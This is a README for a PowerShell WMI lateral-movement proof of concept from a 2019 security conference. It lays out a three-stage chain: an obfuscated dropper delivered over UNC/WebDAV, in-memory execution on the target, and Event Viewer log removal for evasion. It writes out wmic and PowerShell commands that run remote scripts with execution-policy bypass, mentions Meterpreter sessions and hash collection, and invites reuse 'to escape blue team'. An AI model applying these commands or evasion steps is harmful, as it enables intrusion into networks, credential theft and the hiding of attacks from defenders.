Fud WMI for lateral movement (PoC) - ##BsidesDub 2019## 
============

Author: kmkz - [@kmkz_security](https://twitter.com/kmkz_security)

## Intro

This repository contains the PowerShell WMI based Proof of Concept for advanced lateral movement as presented at BsidesDub 2019.

The main goal of this project was to demonstrate the possibilities an attacker might use to bypass detection mechanisms using many techniques in real-life condition.
It implement random class name derivation generation mechanism, payload obfuscation and EventViewer logs removal via WMI un-subscription.
Aditionaly, it use **WMI only** (no WinRM) and do not interact with registry keys to avoid registry monitoring based detection.

Of course, **feel free to reuse code parts for your own purpose in case of need to escape blue team or for simply test-it**.

## Details

   **Stage 1** (executed on attacker's side):
   
The "stage 1" is a simple dropper for payload delivery through UNC/WebDAV using basic obfuscation (require admin. privs for RCE over WMI ofc).
	
It is executed from attackers station (C2C) to run in-memory fud PowerShell without the well-known `IWR/IEX` method calls.

[*] Notes:

UNC/WebDAV could be replaced by WMI namespaces as presented in WmiSploit project `https://github.com/secabstraction/WmiSploit`.
        
However, the executed command is then limited to 8190 chars due to `-EncodedCommand` usage for b64 payload, this is the reason why I prefered this method for the PoC.

An important thing here is that .ps1 file is executed over WMI without `invoke-expression` (iex) nor `wget/invoke-webrequest` (iwr) method to prevent alerting.

Classic stager from command line: 
	```
            wmic.exe /node:"Victime-PC" /user:WORKGROUP\admin process call create "PowErSheLl -eXecUtIonpOliCY BypAsS -NopRofilE -fILe \\Vboxsvr\shared\BSIDESIE\class-derivation.ps1"
	```

    
   **Stage 2** (executed on target):
   
 In-memory build stage 2 using "-File" parameter (obfuscated PowerShell with random Class Derivation).
  
 Randomly generated class derivation and "EventViewer" logs removing for detection mechanisms/blue team evasion.
 
 Stage 1 execution is not removed from logs for debug purpose, it should be modified for a total discretion ;).


   [*] Notes:
     
C2C shell could be used in combination to unicorn to obtains Meterpreter session (stage 2 could be modified depending on the use case):
        
        Examples: `powershell.exe -eXecUtIOnpOlICy BypAsS -File "\\Vboxsvr\shared\BSIDESIE\pwner.ps1"`

        IMPORTANT: Payload delivery using "-File" parameter also permit to add hashes collection when payload (stage 2) is triggered.

   **stage 3** (executed on target):
       
Payload execution and output push/pull via a random file located on attacker's server.
	
## Demo

![](PoC-demo.gif)


## Thanks

- @philiptsukerman - WMI guru - https://github.com/Cybereason/Invoke-WMILM
- @arno0x0x - how to say that... its scripts helped me so often during post-exploitation steps... - https://github.com/Arno0x
- @mattifestation - a ton of useful research and publications
- @secabstraction - https://github.com/secabstraction/WmiSploit
- @all: 'cause we all need others to go further!
